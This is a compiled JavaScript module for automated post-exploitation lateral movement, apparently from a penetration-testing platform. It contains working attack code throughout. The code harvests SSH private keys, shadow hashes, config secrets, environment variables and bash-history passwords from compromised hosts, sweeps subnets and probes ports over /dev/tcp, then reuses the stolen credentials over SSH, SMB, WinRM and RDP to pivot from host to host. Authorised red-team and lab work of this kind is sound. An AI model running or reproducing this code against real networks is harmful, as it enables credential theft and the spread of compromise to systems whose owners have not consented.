import {
  __esm
} from "./chunk-KFQGP6VL.js";

// server/lib/post-exploit/lateral-movement.ts
async function executeRemoteCommand(scanServerHost, targetIp, command, credentials) {
  const { executeTool } = await import("./scan-server-executor-IU64YSBG.js");
  const user = credentials?.username || "root";
  const sshOpts = "-o StrictHostKeyChecking=no -o ConnectTimeout=10 -o BatchMode=yes";
  const keyFlag = credentials?.keyPath ? `-i ${credentials.keyPath}` : "";
  let relayCmd;
  if (credentials?.password && !credentials?.keyPath) {
    relayCmd = `sshpass -p '${credentials.password.replace(/'/g, "'\\''")}'  ssh ${sshOpts} ${user}@${targetIp} '${command.replace(/'/g, "'\\''")}'`;
  } else {
    relayCmd = `ssh ${sshOpts} ${keyFlag} ${user}@${targetIp} '${command.replace(/'/g, "'\\''")}'`;
  }
  const result = await executeTool({
    tool: "bash",
    args: `-c "${relayCmd.replace(/"/g, '\\"')}"`,
    target: targetIp,
    timeoutSeconds: Math.ceil(SSH_TIMEOUT_MS / 1e3)
  });
  return {
    stdout: result.stdout || "",
    stderr: result.stderr || "",
    exitCode: result.exitCode ?? -1
  };
}
async function harvestCredentials(ctx, asset) {
  const targetIp = ctx.helpers.getEffectiveTarget(asset);
  const harvested = [];
  const isWindows = asset.os?.toLowerCase().includes("windows") || asset.services?.some((s) => s.name === "smb" || s.name === "winrm");
  const searchPaths = isWindows ? WINDOWS_CREDENTIAL_PATHS : LINUX_CREDENTIAL_PATHS;
  const findCmd = searchPaths.filter((p) => !p.includes("*")).map((p) => `test -f ${p} && echo "FOUND:${p}"`).join("; ");
  const globCmd = searchPaths.filter((p) => p.includes("*")).map((p) => `ls ${p} 2>/dev/null`).join("; ");
  try {
    const [fixedResult, globResult] = await Promise.all([
      executeRemoteCommand(ctx.scanServerHost, targetIp, findCmd).catch(() => ({ stdout: "", stderr: "", exitCode: 1 })),
      executeRemoteCommand(ctx.scanServerHost, targetIp, globCmd).catch(() => ({ stdout: "", stderr: "", exitCode: 1 }))
    ]);
    const foundFiles = [];
    for (const line of fixedResult.stdout.split("\n")) {
      const match = line.match(/^FOUND:(.+)$/);
      if (match) foundFiles.push(match[1]);
    }
    for (const line of globResult.stdout.split("\n")) {
      const trimmed = line.trim();
      if (trimmed && !trimmed.includes("No such file") && !trimmed.includes("cannot access")) {
        foundFiles.push(trimmed);
      }
    }
    for (const filePath of foundFiles.slice(0, 20)) {
      try {
        const readResult = await executeRemoteCommand(
          ctx.scanServerHost,
          targetIp,
          `head -100 '${filePath}' 2>/dev/null`
        );
        if (readResult.exitCode === 0 && readResult.stdout.trim()) {
          const creds = extractCredentials(readResult.stdout, filePath, targetIp);
          harvested.push(...creds);
        }
      } catch {
      }
    }
    try {
      const envResult = await executeRemoteCommand(ctx.scanServerHost, targetIp, 'env 2>/dev/null | grep -iE "PASS|SECRET|TOKEN|KEY|CRED"');
      if (envResult.exitCode === 0 && envResult.stdout.trim()) {
        const envCreds = extractCredentials(envResult.stdout, "/proc/self/environ", targetIp);
        for (const c of envCreds) {
          c.source = { method: "env_vars", path: "/proc/self/environ", description: "Environment variable", mitreId: "T1552.001" };
        }
        harvested.push(...envCreds);
      }
    } catch {
    }
    try {
      const histResult = await executeRemoteCommand(
        ctx.scanServerHost,
        targetIp,
        'cat /root/.bash_history /home/*/.bash_history 2>/dev/null | grep -iE "pass|mysql.*-p|ssh.*@|smbclient|curl.*-u" | tail -20'
      );
      if (histResult.exitCode === 0 && histResult.stdout.trim()) {
        const historyCreds = parseHistoryForCredentials(histResult.stdout, targetIp);
        harvested.push(...historyCreds);
      }
    } catch {
    }
  } catch (err) {
    ctx.helpers.addLog(ctx.state, {
      phase: "lateral_movement",
      type: "warning",
      title: `Credential Harvest Failed: ${targetIp}`,
      detail: err.message
    });
  }
  const seen = /* @__PURE__ */ new Set();
  const unique = harvested.filter((c) => {
    const key = `${c.username}:${c.value}`;
    if (seen.has(key)) return false;
    seen.add(key);
    return true;
  });
  return unique;
}
function extractCredentials(content, filePath, sourceHost) {
  const results = [];
  for (const { pattern, type, usernameGroup, valueGroup } of CREDENTIAL_PATTERNS) {
    const matches = content.matchAll(new RegExp(pattern.source, pattern.flags + "g"));
    for (const match of matches) {
      const username = usernameGroup !== void 0 && usernameGroup > 0 ? match[usernameGroup] || "unknown" : inferUsername(filePath);
      const value = valueGroup !== void 0 ? match[valueGroup] || "" : "";
      if (!value || value.length < 3) continue;
      if (value === "changeme" || value === "password" || value === "example") continue;
      results.push({
        id: `cred-${Math.random().toString(36).substring(2, 10)}`,
        type,
        username,
        value: value.substring(0, 512),
        // Truncate long values
        source: classifySource(filePath),
        sourceHost,
        sourceFile: filePath,
        reused: false,
        validOn: [],
        harvestedAt: Date.now()
      });
    }
  }
  return results;
}
function inferUsername(filePath) {
  const homeMatch = filePath.match(/\/home\/([^/]+)\//);
  if (homeMatch) return homeMatch[1];
  if (filePath.includes("/root/")) return "root";
  return "unknown";
}
function classifySource(filePath) {
  if (filePath.includes(".ssh/")) return { method: "ssh_key_harvest", path: filePath, description: "SSH key file", mitreId: "T1552.004" };
  if (filePath.includes("/shadow")) return { method: "config_parse", path: filePath, description: "Shadow file hash", mitreId: "T1003.008" };
  if (filePath.includes(".env") || filePath.includes("config")) return { method: "config_parse", path: filePath, description: "Application config", mitreId: "T1552.001" };
  if (filePath.includes("samba") || filePath.includes("/srv/")) return { method: "smb_share", path: filePath, description: "SMB share file", mitreId: "T1552.001" };
  if (filePath.includes("history")) return { method: "history_parse", path: filePath, description: "Command history", mitreId: "T1552.003" };
  return { method: "file_search", path: filePath, description: "Credential file", mitreId: "T1552.001" };
}
function parseHistoryForCredentials(history, sourceHost) {
  const results = [];
  for (const line of history.split("\n")) {
    const mysqlMatch = line.match(/mysql\s+.*-u\s+(\S+)\s+-p(\S+)/);
    if (mysqlMatch) {
      results.push({
        id: `cred-${Math.random().toString(36).substring(2, 10)}`,
        type: "password",
        username: mysqlMatch[1],
        value: mysqlMatch[2],
        source: { method: "history_parse", path: ".bash_history", description: "MySQL password from history", mitreId: "T1552.003" },
        sourceHost,
        sourceFile: ".bash_history",
        reused: false,
        validOn: [],
        harvestedAt: Date.now()
      });
    }
    const sshMatch = line.match(/sshpass\s+-p\s+'?([^'\s]+)'?\s+ssh\s+(\S+)@(\S+)/);
    if (sshMatch) {
      results.push({
        id: `cred-${Math.random().toString(36).substring(2, 10)}`,
        type: "password",
        username: sshMatch[2],
        value: sshMatch[1],
        source: { method: "history_parse", path: ".bash_history", description: "SSH password from history", mitreId: "T1552.003" },
        sourceHost,
        sourceFile: ".bash_history",
        reused: false,
        validOn: [],
        harvestedAt: Date.now()
      });
    }
    const curlMatch = line.match(/curl\s+.*-u\s+(\S+):(\S+)/);
    if (curlMatch) {
      results.push({
        id: `cred-${Math.random().toString(36).substring(2, 10)}`,
        type: "password",
        username: curlMatch[1],
        value: curlMatch[2],
        source: { method: "history_parse", path: ".bash_history", description: "HTTP basic auth from history", mitreId: "T1552.003" },
        sourceHost,
        sourceFile: ".bash_history",
        reused: false,
        validOn: [],
        harvestedAt: Date.now()
      });
    }
  }
  return results;
}
async function discoverPivotTargets(ctx, asset, knownHosts = []) {
  const targetIp = ctx.helpers.getEffectiveTarget(asset);
  const targets = [];
  try {
    const arpResult = await executeRemoteCommand(
      ctx.scanServerHost,
      targetIp,
      "arp -an 2>/dev/null | grep -v incomplete | awk '{print $2}' | tr -d '()'"
    );
    const arpHosts = arpResult.stdout.split("\n").map((l) => l.trim()).filter((l) => l && l !== targetIp && /^\d+\.\d+\.\d+\.\d+$/.test(l));
    const hostsResult = await executeRemoteCommand(
      ctx.scanServerHost,
      targetIp,
      "cat /etc/hosts 2>/dev/null; cat /root/.ssh/known_hosts /home/*/.ssh/known_hosts 2>/dev/null | awk '{print $1}'"
    );
    const knownFromFiles = hostsResult.stdout.split("\n").map((l) => l.trim().split(/\s+/)[0]).filter((l) => l && l !== targetIp && /^\d+\.\d+\.\d+\.\d+$/.test(l) && !l.startsWith("127."));
    const subnetMatch = targetIp.match(/^(\d+\.\d+\.\d+)\./);
    let sweepHosts = [];
    if (subnetMatch) {
      const sweepResult = await executeRemoteCommand(
        ctx.scanServerHost,
        targetIp,
        `for i in $(seq 1 254); do (ping -c1 -W1 ${subnetMatch[1]}.$i &>/dev/null && echo ${subnetMatch[1]}.$i) & done; wait`
      ).catch(() => ({ stdout: "", stderr: "", exitCode: 1 }));
      sweepHosts = sweepResult.stdout.split("\n").map((l) => l.trim()).filter((l) => l && l !== targetIp && /^\d+\.\d+\.\d+\.\d+$/.test(l));
    }
    const allHosts = [.../* @__PURE__ */ new Set([...arpHosts, ...knownFromFiles, ...sweepHosts, ...knownHosts])].filter((h) => h !== targetIp).slice(0, PIVOT_MAX_TARGETS);
    for (const host of allHosts) {
      try {
        const portResult = await executeRemoteCommand(
          ctx.scanServerHost,
          targetIp,
          `(echo >/dev/tcp/${host}/22 2>/dev/null && echo "22:ssh") ; (echo >/dev/tcp/${host}/445 2>/dev/null && echo "445:smb") ; (echo >/dev/tcp/${host}/5985 2>/dev/null && echo "5985:winrm") ; (echo >/dev/tcp/${host}/3389 2>/dev/null && echo "3389:rdp") ; (echo >/dev/tcp/${host}/3306 2>/dev/null && echo "3306:mysql") ; (echo >/dev/tcp/${host}/5432 2>/dev/null && echo "5432:postgres") ; true`
        );
        const openPorts = [];
        const services = [];
        for (const line of portResult.stdout.split("\n")) {
          const portMatch = line.match(/^(\d+):(\S+)$/);
          if (portMatch) {
            openPorts.push(parseInt(portMatch[1]));
            services.push(portMatch[2]);
          }
        }
        if (openPorts.length > 0) {
          targets.push({
            ip: host,
            openPorts,
            services,
            reachableFrom: targetIp,
            hopCount: 1
          });
        }
      } catch {
      }
    }
  } catch (err) {
    ctx.helpers.addLog(ctx.state, {
      phase: "lateral_movement",
      type: "warning",
      title: `Network Discovery Failed: ${targetIp}`,
      detail: err.message
    });
  }
  return targets;
}
async function attemptPivot(ctx, sourceAsset, target, credentials) {
  const sourceIp = ctx.helpers.getEffectiveTarget(sourceAsset);
  const attempts = [];
  const protocols = [];
  if (target.openPorts.includes(22)) protocols.push({ proto: "ssh", port: 22, mitreId: "T1021.004" });
  if (target.openPorts.includes(445)) protocols.push({ proto: "smb", port: 445, mitreId: "T1021.002" });
  if (target.openPorts.includes(5985)) protocols.push({ proto: "winrm", port: 5985, mitreId: "T1021.006" });
  if (target.openPorts.includes(3389)) protocols.push({ proto: "rdp", port: 3389, mitreId: "T1021.001" });
  for (const { proto, port, mitreId } of protocols) {
    let succeeded = false;
    for (const cred of credentials) {
      if (succeeded) break;
      if (cred.type === "hash") continue;
      if (cred.type === "token") continue;
      const startTime = Date.now();
      let success = false;
      let output = "";
      let accessLevel;
      try {
        switch (proto) {
          case "ssh": {
            const result = await attemptSshPivot(ctx, sourceIp, target.ip, cred);
            success = result.success;
            output = result.output;
            accessLevel = result.accessLevel;
            break;
          }
          case "smb": {
            const result = await attemptSmbPivot(ctx, sourceIp, target.ip, cred);
            success = result.success;
            output = result.output;
            accessLevel = result.accessLevel;
            break;
          }
          case "winrm": {
            const result = await attemptWinrmPivot(ctx, sourceIp, target.ip, cred);
            success = result.success;
            output = result.output;
            accessLevel = result.accessLevel;
            break;
          }
          case "rdp": {
            const result = await attemptRdpPivot(ctx, sourceIp, target.ip, cred);
            success = result.success;
            output = result.output;
            accessLevel = result.accessLevel;
            break;
          }
        }
      } catch (err) {
        output = err.message;
      }
      const attempt = {
        id: `pivot-${Math.random().toString(36).substring(2, 10)}`,
        sourceHost: sourceIp,
        targetHost: target.ip,
        protocol: proto,
        credential: cred,
        success,
        accessLevel,
        output: output.substring(0, 2048),
        durationMs: Date.now() - startTime,
        mitreId,
        timestamp: Date.now()
      };
      attempts.push(attempt);
      if (success) {
        succeeded = true;
        cred.reused = true;
        cred.validOn.push(target.ip);
      }
    }
  }
  return attempts;
}
async function attemptSshPivot(ctx, sourceIp, targetIp, cred) {
  let cmd;
  if (cred.type === "ssh_key") {
    const keyFile = `/tmp/.pivot_key_${Date.now()}`;
    await executeRemoteCommand(ctx.scanServerHost, sourceIp, `echo '${cred.value.replace(/'/g, "'\\''")}' > ${keyFile} && chmod 600 ${keyFile}`);
    cmd = `ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10 -o BatchMode=yes -i ${keyFile} ${cred.username}@${targetIp} 'id; whoami; hostname' 2>&1; rm -f ${keyFile}`;
  } else {
    cmd = `sshpass -p '${cred.value.replace(/'/g, "'\\''")}' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10 ${cred.username}@${targetIp} 'id; whoami; hostname' 2>&1`;
  }
  const result = await executeRemoteCommand(ctx.scanServerHost, sourceIp, cmd);
  const success = result.exitCode === 0 && (result.stdout.includes("uid=") || result.stdout.includes(cred.username));
  let accessLevel;
  if (success) {
    if (result.stdout.includes("uid=0") || result.stdout.includes("root")) accessLevel = "root";
    else if (result.stdout.includes("sudo") || result.stdout.includes("admin")) accessLevel = "admin";
    else accessLevel = "user";
  }
  return { success, output: result.stdout + result.stderr, accessLevel };
}
async function attemptSmbPivot(ctx, sourceIp, targetIp, cred) {
  if (cred.type === "ssh_key") return { success: false, output: "SSH keys not applicable to SMB" };
  const cmd = `smbclient -L //${targetIp} -U '${cred.username}%${cred.value.replace(/'/g, "'\\''")}' --no-pass 2>&1 || smbclient -L //${targetIp} -U '${cred.username}' --password='${cred.value.replace(/'/g, "'\\''")}' 2>&1`;
  const result = await executeRemoteCommand(ctx.scanServerHost, sourceIp, cmd);
  const success = result.exitCode === 0 || result.stdout.includes("Sharename") || result.stdout.includes("IPC$") || result.stdout.includes("Disk");
  const accessLevel = success ? cred.username === "Administrator" || cred.username === "admin" ? "admin" : "user" : void 0;
  return { success, output: result.stdout + result.stderr, accessLevel };
}
async function attemptWinrmPivot(ctx, sourceIp, targetIp, cred) {
  if (cred.type === "ssh_key") return { success: false, output: "SSH keys not applicable to WinRM" };
  const cmd = `curl -s --connect-timeout 10 -u '${cred.username}:${cred.value.replace(/'/g, "'\\''")}' http://${targetIp}:5985/wsman -H "Content-Type: application/soap+xml" 2>&1`;
  const result = await executeRemoteCommand(ctx.scanServerHost, sourceIp, cmd);
  const success = result.exitCode === 0 && !result.stdout.includes("401") && !result.stdout.includes("Connection refused");
  const accessLevel = success ? "admin" : void 0;
  return { success, output: result.stdout, accessLevel };
}
async function attemptRdpPivot(ctx, sourceIp, targetIp, cred) {
  if (cred.type === "ssh_key") return { success: false, output: "SSH keys not applicable to RDP" };
  const cmd = `timeout 10 xfreerdp /v:${targetIp} /u:${cred.username} /p:'${cred.value.replace(/'/g, "'\\''")}' /cert-ignore +auth-only 2>&1 || echo "RDP_CHECK_DONE"`;
  const result = await executeRemoteCommand(ctx.scanServerHost, sourceIp, cmd);
  const success = result.exitCode === 0 && !result.stdout.includes("ERRCONNECT") && !result.stdout.includes("Authentication failure");
  const accessLevel = success ? "user" : void 0;
  return { success, output: result.stdout + result.stderr, accessLevel };
}
async function executeLateralMovement(ctx, initialAsset, options) {
  const startTime = Date.now();
  const maxDepth = options?.maxDepth || PIVOT_MAX_DEPTH;
  const maxTargets = options?.maxTargets || PIVOT_MAX_TARGETS;
  const result = {
    credentialsHarvested: [],
    pivotTargetsDiscovered: [],
    pivotAttempts: [],
    successfulPivots: [],
    pivotGraph: [],
    hostsCompromised: [],
    totalHops: 0,
    maxDepth: 0,
    evidenceIds: [],
    durationMs: 0
  };
  const compromisedHosts = /* @__PURE__ */ new Set([ctx.helpers.getEffectiveTarget(initialAsset)]);
  const queue = [{ asset: initialAsset, depth: 0 }];
  ctx.helpers.addLog(ctx.state, {
    phase: "lateral_movement",
    type: "info",
    title: "\u{1F500} Lateral Movement Starting",
    detail: `Initial host: ${ctx.helpers.getEffectiveTarget(initialAsset)} | Max depth: ${maxDepth} | Max targets: ${maxTargets}`
  });
  while (queue.length > 0) {
    const { asset: currentAsset, depth } = queue.shift();
    if (depth >= maxDepth) continue;
    const currentIp = ctx.helpers.getEffectiveTarget(currentAsset);
    ctx.state.currentAction = `Harvesting credentials from ${currentIp}...`;
    ctx.helpers.broadcastOpsUpdate(ctx.state.engagementId, {
      type: "lateral_movement",
      action: "credential_harvest",
      host: currentIp,
      depth
    });
    const credentials = await harvestCredentials(ctx, currentAsset);
    result.credentialsHarvested.push(...credentials);
    if (credentials.length > 0) {
      ctx.helpers.addLog(ctx.state, {
        phase: "lateral_movement",
        type: "success",
        title: `\u{1F511} Credentials Harvested: ${currentIp}`,
        detail: `Found ${credentials.length} credential(s): ${credentials.map((c) => `${c.username} (${c.type})`).join(", ")}`
      });
      const harvestEvidence = ctx.evidence.createIntegrityEnvelope(
        {
          type: "credential_harvest",
          host: currentIp,
          credentials: credentials.map((c) => ({ username: c.username, type: c.type, source: c.source.method })),
          count: credentials.length
        },
        "lateral_movement"
      );
      const harvestProvenance = ctx.evidence.buildProvenance("lateral_movement", "credential_harvester", ctx.operatorCtx);
      const harvestGateResult = await ctx.evidence.evidenceGate(ctx.state, {
        content: harvestEvidence,
        provenance: harvestProvenance,
        phase: "lateral_movement"
      });
      if (harvestGateResult?.id) result.evidenceIds.push(harvestGateResult.id);
    }
    ctx.state.currentAction = `Discovering pivot targets from ${currentIp}...`;
    const targets = await discoverPivotTargets(ctx, currentAsset, options?.knownHosts);
    const newTargets = targets.filter((t) => !compromisedHosts.has(t.ip));
    result.pivotTargetsDiscovered.push(...newTargets);
    if (newTargets.length > 0) {
      ctx.helpers.addLog(ctx.state, {
        phase: "lateral_movement",
        type: "info",
        title: `\u{1F3AF} Pivot Targets Found: ${newTargets.length}`,
        detail: newTargets.map((t) => `${t.ip} [${t.services.join(",")}]`).join(" | ")
      });
    }
    for (const target of newTargets.slice(0, maxTargets)) {
      if (compromisedHosts.has(target.ip)) continue;
      ctx.state.currentAction = `Pivoting to ${target.ip} via ${target.services.join("/")}...`;
      ctx.helpers.broadcastOpsUpdate(ctx.state.engagementId, {
        type: "lateral_movement",
        action: "pivot_attempt",
        source: currentIp,
        target: target.ip,
        depth: depth + 1
      });
      const pivotAttempts = await attemptPivot(ctx, currentAsset, target, credentials);
      result.pivotAttempts.push(...pivotAttempts);
      const successfulAttempt = pivotAttempts.find((a) => a.success);
      if (successfulAttempt) {
        result.successfulPivots.push(successfulAttempt);
        compromisedHosts.add(target.ip);
        result.hostsCompromised.push(target.ip);
        result.totalHops++;
        result.maxDepth = Math.max(result.maxDepth, depth + 1);
        result.pivotGraph.push({
          from: currentIp,
          to: target.ip,
          protocol: successfulAttempt.protocol,
          credential: successfulAttempt.credential.id,
          accessLevel: successfulAttempt.accessLevel || "unknown",
          timestamp: Date.now()
        });
        ctx.helpers.addLog(ctx.state, {
          phase: "lateral_movement",
          type: "success",
          title: `\u2705 Pivot Successful: ${currentIp} \u2192 ${target.ip}`,
          detail: `Protocol: ${successfulAttempt.protocol} | User: ${successfulAttempt.credential.username} | Access: ${successfulAttempt.accessLevel} | Hop: ${depth + 1}`
        });
        const pivotEvidence = ctx.evidence.createIntegrityEnvelope(
          {
            type: "lateral_pivot",
            source: currentIp,
            target: target.ip,
            protocol: successfulAttempt.protocol,
            credential: successfulAttempt.credential.username,
            accessLevel: successfulAttempt.accessLevel,
            hopDepth: depth + 1
          },
          "lateral_movement"
        );
        const pivotProvenance = ctx.evidence.buildProvenance("lateral_movement", `pivot_${successfulAttempt.protocol}`, ctx.operatorCtx);
        const pivotGateResult = await ctx.evidence.evidenceGate(ctx.state, {
          content: pivotEvidence,
          provenance: pivotProvenance,
          phase: "lateral_movement"
        });
        if (pivotGateResult?.id) result.evidenceIds.push(pivotGateResult.id);
        const newAsset = {
          ...target,
          ip: target.ip,
          compromised: true,
          accessLevel: successfulAttempt.accessLevel
        };
        queue.push({ asset: newAsset, depth: depth + 1 });
      }
    }
  }
  result.durationMs = Date.now() - startTime;
  ctx.helpers.addLog(ctx.state, {
    phase: "lateral_movement",
    type: result.successfulPivots.length > 0 ? "success" : "info",
    title: "\u{1F500} Lateral Movement Complete",
    detail: `Credentials: ${result.credentialsHarvested.length} | Targets: ${result.pivotTargetsDiscovered.length} | Pivots: ${result.successfulPivots.length}/${result.pivotAttempts.length} | Hosts: ${result.hostsCompromised.length} | Max depth: ${result.maxDepth} | Duration: ${(result.durationMs / 1e3).toFixed(1)}s`
  });
  return result;
}
var SSH_TIMEOUT_MS, PIVOT_MAX_DEPTH, PIVOT_MAX_TARGETS, LINUX_CREDENTIAL_PATHS, WINDOWS_CREDENTIAL_PATHS, CREDENTIAL_PATTERNS;
var init_lateral_movement = __esm({
  "server/lib/post-exploit/lateral-movement.ts"() {
    SSH_TIMEOUT_MS = 15e3;
    PIVOT_MAX_DEPTH = 3;
    PIVOT_MAX_TARGETS = 10;
    LINUX_CREDENTIAL_PATHS = [
      // SSH keys
      "/root/.ssh/id_rsa",
      "/root/.ssh/id_ed25519",
      "/home/*/.ssh/id_rsa",
      "/home/*/.ssh/id_ed25519",
      "/home/*/.ssh/authorized_keys",
      // Config files with passwords
      "/etc/shadow",
      "/var/www/html/wp-config.php",
      "/var/www/html/.env",
      "/opt/*/.env",
      "/root/.bash_history",
      "/home/*/.bash_history",
      "/home/*/.mysql_history",
      // Database configs
      "/etc/mysql/debian.cnf",
      "/var/lib/mysql/.my.cnf",
      // Application configs
      "/etc/tomcat*/tomcat-users.xml",
      "/opt/tomcat/conf/tomcat-users.xml",
      // FTP/Samba
      "/etc/vsftpd/virtual_users.db",
      "/etc/samba/smbpasswd",
      // Redis
      "/etc/redis/redis.conf",
      // Credentials files (planted for labs)
      "/tmp/credentials.txt",
      "/opt/credentials.txt",
      "/root/credentials.txt",
      "/home/*/credentials.txt"
    ];
    WINDOWS_CREDENTIAL_PATHS = [
      // SMB shares
      "/srv/samba/share/credentials.txt",
      "/srv/samba/share/passwords.txt",
      "/srv/samba/share/admin_creds.txt",
      "/srv/samba/share/*.conf",
      // Web configs
      "/var/www/html/web.config",
      "/var/www/html/appsettings.json",
      // IIS-equivalent
      "/etc/nginx/conf.d/*.conf",
      // PowerShell history equivalent
      "/root/.bash_history",
      "/home/*/.bash_history",
      // Registry-equivalent configs
      "/etc/samba/smb.conf"
    ];
    CREDENTIAL_PATTERNS = [
      // user:password format
      { pattern: /^([a-zA-Z0-9._-]+):(.+)$/m, type: "password", usernameGroup: 1, valueGroup: 2 },
      // username=X password=Y
      { pattern: /username[=: ]+([^\s]+)[\s\S]*?password[=: ]+([^\s]+)/im, type: "password", usernameGroup: 1, valueGroup: 2 },
      // DB_PASSWORD=X
      { pattern: /(?:DB_PASSWORD|MYSQL_PASSWORD|REDIS_PASSWORD|PASSWORD)[=: ]+['"]?([^\s'"]+)/im, type: "password", usernameGroup: 0, valueGroup: 1 },
      // SSH private key
      { pattern: /(-----BEGIN (?:RSA |EC |OPENSSH )?PRIVATE KEY-----[\s\S]+?-----END (?:RSA |EC |OPENSSH )?PRIVATE KEY-----)/m, type: "ssh_key", usernameGroup: 0, valueGroup: 1 },
      // Hash formats (shadow file)
      { pattern: /^([a-zA-Z0-9._-]+):(\$[0-9a-z]+\$[^\s:]+)/m, type: "hash", usernameGroup: 1, valueGroup: 2 },
      // Token/API key
      { pattern: /(?:API_KEY|TOKEN|SECRET)[=: ]+['"]?([a-zA-Z0-9_-]{20,})/im, type: "token", usernameGroup: 0, valueGroup: 1 }
    ];
  }
});
init_lateral_movement();
export {
  CREDENTIAL_PATTERNS,
  LINUX_CREDENTIAL_PATHS,
  PIVOT_MAX_DEPTH,
  PIVOT_MAX_TARGETS,
  WINDOWS_CREDENTIAL_PATHS,
  executeRemoteCommand as _executeRemoteCommand,
  attemptPivot,
  classifySource,
  discoverPivotTargets,
  executeLateralMovement,
  extractCredentials,
  harvestCredentials,
  inferUsername,
  parseHistoryForCredentials
};
